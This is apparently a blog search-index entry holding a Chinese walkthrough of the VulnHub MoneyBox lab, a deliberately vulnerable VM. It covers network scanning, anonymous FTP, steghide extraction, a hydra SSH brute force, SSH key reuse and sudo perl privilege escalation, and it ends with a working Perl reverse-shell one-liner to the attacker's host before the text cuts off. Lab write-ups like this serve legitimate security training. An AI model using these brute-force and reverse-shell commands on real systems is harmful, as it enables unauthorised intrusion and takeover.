<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>VulnHub靶机MoneyBox复现</title>
    <link href="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>借鉴文章：</p><p><a href="https://blog.csdn.net/YueXuan_521/article/details/135324089">https://blog.csdn.net/YueXuan_521/article/details/135324089</a></p><p><a href="https://blog.csdn.net/Aluxian_/article/details/128672602">https://blog.csdn.net/Aluxian_/article/details/128672602</a></p></blockquote><h1 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h1><p>靶机网址：<a href="https://www.vulnhub.com/entry/moneybox-1,653/">https://www.vulnhub.com/entry/moneybox-1,653/</a></p><p>VirtualBox网址：<a href="https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html">https://www.oracle.com/cn/virtualization/technologies/vm/downloads/virtualbox-downloads.html</a></p><p>如果出现以下报错</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425212824436.png" alt="image-20250425212824436"></p><p>就需要对安装目录给予权限，我的安装目录是 <code>E:\VirtualBox</code> ，就以管理员身份打开命令提示符，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls E:\VirtualBox /reset /t /c<br>icacls E:\VirtualBox /inheritance:d /t /c<br>icacls E:\VirtualBox /grant *S-1-5-32-545:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-32-545:(DE,WD,AD,WEA,WA) /t /c<br>icacls E:\VirtualBox /grant *S-1-5-11:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-11:(DE,WD,AD,WEA,WA) /t /c<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213050136.png" alt="image-20250425213050136"></p><p>直接选择是，后面的默认选择即可</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213231938.png" alt="image-20250425213231938"></p><p>安装好后以管理员身份打开，导入下载好的<code>MONEYBOX.ova</code></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213349283.png" alt="image-20250425213349283"></p><p>然后选择好安装目录，等着导入好就行</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425213553737.png" alt="image-20250425213553737"></p><p>选择启动，可能出现以下报错</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215240799.png" alt="image-20250425215240799"></p><p>更改网络设置，使用桥连网卡即可</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215312978.png" alt="image-20250425215312978"></p><h1 id="IP探测"><a href="#IP探测" class="headerlink" title="IP探测"></a>IP探测</h1><h3 id="寻找靶机"><a href="#寻找靶机" class="headerlink" title="寻找靶机"></a>寻找靶机</h3><p>需要准备一台kali，要和靶机处于同一个网段（可以都用桥接模式）</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425215622260.png" alt="image-20250425215622260"></p><p>首先获取kali的网卡信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225742643.png" alt="image-20250425225742643"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br></code></pre></td></tr></table></figure><h4 id="使用nmap工具扫描"><a href="#使用nmap工具扫描" class="headerlink" title="使用nmap工具扫描"></a>使用<code>nmap</code>工具扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><ul><li>**<code>nmap</code>：**网络探索和安全扫描工具</li><li>**<code>192.168.1.0/24：</code> **目标 IP 地址范围。这里的<code>/24</code>表示子网掩码为 <code>255.255.255.0</code>，这意味着 Nmap 将扫描从<code>192.168.1.1</code>到<code>192.168.1.254</code>的所有 IP 地址</li></ul><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425225704959.png" alt="image-20250425225704959"></p><p>看到这个机器开了<code>ftp</code>和<code>ssh</code>，就可以知道是靶机</p><h4 id="使用arp扫描"><a href="#使用arp扫描" class="headerlink" title="使用arp扫描"></a>使用<code>arp</code>扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arp-scan -I eth0 -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230118925.png" alt="image-20250425230118925"></p><h4 id="使用netdiscover"><a href="#使用netdiscover" class="headerlink" title="使用netdiscover"></a>使用<code>netdiscover</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425230430356.png" alt="image-20250425230430356"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure><p>得到靶机和<code>kali</code>的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br>靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure><h3 id="深入探测"><a href="#深入探测" class="headerlink" title="深入探测"></a>深入探测</h3><p>使用<code>nmap</code>进行深入探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br><br><span class="hljs-comment"># 参数含义：</span><br>-A：Aggressive（激进）扫描模式。这是一个组合选项，包含了以下功能：<br>-sS（TCP SYN 扫描）<br>-sU（UDP 扫描）<br>-sT（TCP connect() 扫描）<br>-sV（服务版本探测）<br>-sC（默认脚本扫描）<br>OS detection（操作系统检测）<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425231606085.png" alt="image-20250425231606085"></p><p>靶机开放了三个端口：</p><p><code>21</code>：是<code>ftp</code>服务，允许匿名登录，还有一张<code>trytofind.jpg</code>图片</p><p><code>22</code>：是<code>ssh</code>服务有一些<code>key</code></p><p><code>80</code>：是<code>http</code>服务存在一个网页<code>Title：MoneyBox</code></p><h1 id="FTP服务探测"><a href="#FTP服务探测" class="headerlink" title="FTP服务探测"></a>FTP服务探测</h1><p>尝试进行匿名登录FTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># FTP的匿名登录一般有三种：</span><br>1、 用户名：anonymous 密码：anonymous 或者 为空<br>2、 用户名：FTP 密码：FTP 或者为空<br>3、 用户名：USER 密码：pass<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232151081.png" alt="image-20250425232151081"></p><p>成功登录，先看看有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232255654.png" alt="image-20250425232255654"></p><p>有一个 JPG 图片，使用<code>get</code>命令下载图片</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/trytofind.jpg" alt="trytofind"></p><p>看到图片想到CTF的图片隐写，使用<code>steghide</code>工具查看图片详细信息</p><p><code>steghide</code>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure><p>查看图片信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steghide</span> <span class="hljs-literal">info</span> trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425232905214.png" alt="image-20250425232905214"></p><p>发现需要密码，接下来需要找密码</p><h1 id="HTTP服务探测"><a href="#HTTP服务探测" class="headerlink" title="HTTP服务探测"></a>HTTP服务探测</h1><p>直接访问目标靶机的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233220536.png" alt="image-20250425233220536"></p><p>看网站先看源码，不过没有有用的东西</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233302824.png" alt="image-20250425233302824"></p><p>那就直接用<code>dirsearch</code>扫描目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.1.102/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233509276.png" alt="image-20250425233509276"></p><p>可以扫出个301重定向的<code>/blogs</code>页面，访问看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/blogs<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233628440.png" alt="image-20250425233628440"></p><p>还是先查看源码</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233953950.png" alt="image-20250425233953950"></p><p>在最后可以发现一个<code>hint</code>，访问<code>/S3cr3t-T3xt</code>看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.102/S3cr3t-T3xt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233827255.png" alt="image-20250425233827255"></p><p>继续看源码</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425233859495.png" alt="image-20250425233859495"></p><p>得到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 密码</span><br>3xtr4ctd4t4<br></code></pre></td></tr></table></figure><p>重新再去看看图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide info trytofind.jpg<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234146632.png" alt="image-20250425234146632"></p><p>发现有一个<code>data.txt</code>文件，使用<code>steghide</code>提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4<br></code></pre></td></tr></table></figure><ul><li><code>extract</code>：指定要执行的操作为提取隐藏数据</li><li><code>-sf</code>：指定源文件为 <code>trytofind.jpg</code>，这是一个包含隐藏数据的图像文件</li><li><code>-p</code>：指定用于解密隐藏数据的密码。在这个例子中，密码为 3xtr4ctd4t4</li></ul><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234441416.png" alt="image-20250425234441416"></p><p>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> data.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425234600624.png" alt="image-20250425234600624"></p><p>AI翻译一下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">你好…… renu<br>我要告诉你一些重要的事。你的密码太弱了，所以更改一下你的密码吧。<br>别小看这件事……<br></code></pre></td></tr></table></figure><h1 id="SSH服务探测"><a href="#SSH服务探测" class="headerlink" title="SSH服务探测"></a>SSH服务探测</h1><h3 id="使用hydra爆破密码"><a href="#使用hydra爆破密码" class="headerlink" title="使用hydra爆破密码"></a>使用<code>hydra</code>爆破密码</h3><p>在<code>data.txt</code>文件中得到的用户名<code>renu</code>就是<code>ssh</code>服务的，因为就剩这一个服务了</p><p>提示密码太弱，使用<code>hydra</code>工具对<code>ssh</code>服务进行弱口令爆破</p><p>在kali的<code>/usr/share/wordlists/</code>目录下有一个字典</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235415886.png" alt="image-20250425235415886"></p><p>将其解压缩</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235553250.png" alt="image-20250425235553250"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l renu -P rockyou.txt 192.168.1.102 ssh<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235646192.png" alt="image-20250425235646192"></p><p>得到密码是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">987654321<br></code></pre></td></tr></table></figure><h3 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a><code>SSH</code>远程登录</h3><p>直接<code>ssh</code>远程登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh renu@192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235835395.png" alt="image-20250425235835395"></p><p>成功登录，先看看有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250425235945856.png" alt="image-20250425235945856"></p><p>发现有个<code>user1.txt</code>文件，查看得到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user1.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000034742.png" alt="image-20250426000034742"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r1&#123;F14g:0ku74tbd3777y4&#125;<br></code></pre></td></tr></table></figure><p>还有一个<code>ftp</code>目录，里面就是刚才在FTP服务得到的图片</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000206950.png" alt="image-20250426000206950"></p><p>返回上一级目录看看</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000351201.png" alt="image-20250426000351201"></p><p>发现还有一个<code>lily</code>目录，说明还存在一个<code>lily</code>用户，进入目录看看，得到第二个flag</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426000506824.png" alt="image-20250426000506824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r&#123;F14g:tr5827r5wu6nklao&#125;<br></code></pre></td></tr></table></figure><h3 id="切换为lily用户"><a href="#切换为lily用户" class="headerlink" title="切换为lily用户"></a>切换为<code>lily</code>用户</h3><p>查看一下历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002159693.png" alt="image-20250426002159693"></p><blockquote><p>猜测<code>ssh</code>登录的账户lily为本机的<code>lily</code>用户，那么<code>SSH</code>公钥配置操作就是在本机上进行的，根据<code>SSH</code>公钥工作机制，如果<code>renu</code>用户进行了<code>ssh-keygen -t rsa</code>操作，会在<code>renu</code>的<code>~/.ssh/</code>中生成<code>id_rsa</code>和<code>id_rsa.pub</code>文件</p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426001618917.png" alt="image-20250426001618917"></p><blockquote><p>同时，如果<code>renu</code>用户进行了<code>ssh-copy-id lily@192.168.43.80</code>操作，将会把刚才生成的<code>id_rsa.pub</code>拷贝到<code>192.168.43.80</code>主机上的lily账户<code>～/.ssh/authorized_keys</code>文件中。如果<code>192.168.43.80</code>上的lily用户就是本机的lily用户，那么<code>lily</code>用户下<code>~/.ssh/authorized_keys</code>文件中的公钥应该与<code>renu</code>生成的<code>id_rsa.pub</code>公钥一致</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br><span class="hljs-built_in">cd</span> /home/lily/.ssh/<br><span class="hljs-built_in">cat</span> authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002453872.png" alt="image-20250426002453872"></p><p>可以发现两个是一模一样，那么<code>renu</code>用户可以通过SSH公钥验证的方式登陆到本机的lily的账户上</p><p>尝试直接<code>su</code>到<code>lily</code>用户，但是需要密码</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426002935648.png" alt="image-20250426002935648"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa lily@192.168.1.102<br><span class="hljs-comment"># -i 选项，用于指定私钥文件 id_rsa。</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003043780.png" alt="image-20250426003043780"></p><h3 id="提权为root"><a href="#提权为root" class="headerlink" title="提权为root"></a>提权为<code>root</code></h3><p>成功登录，尝试进行提权，但是直接使用<code>su</code>还是需要密码</p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003329930.png" alt="image-20250426003329930"></p><p>查看历史命令，发现<code>lily</code>用户编辑了<code>sudoers</code>，并且查找了一些具有<code>suid</code>权限的文件，执行了<code>sudo -l</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003425435.png" alt="image-20250426003425435"></p><p>看看当前用户可用的<code>sudo</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003730564.png" alt="image-20250426003730564"></p><p>发现可以使用<code>perl</code>命令</p><p>参考提权网站：<a href="https://gtfobins.github.io/gtfobins/perl/">https://gtfobins.github.io/gtfobins/perl/</a></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426003845131.png" alt="image-20250426003845131"></p><p>可以直接提权，也可以反弹<code>shell</code></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h4><p>在<code>kali</code>监听<code>2333</code>端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004313655.png" alt="image-20250426004313655"></p><p>靶机输入以下命令，加上<code>sudo</code>可以提升权限执行<code>perl</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.1.103&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img 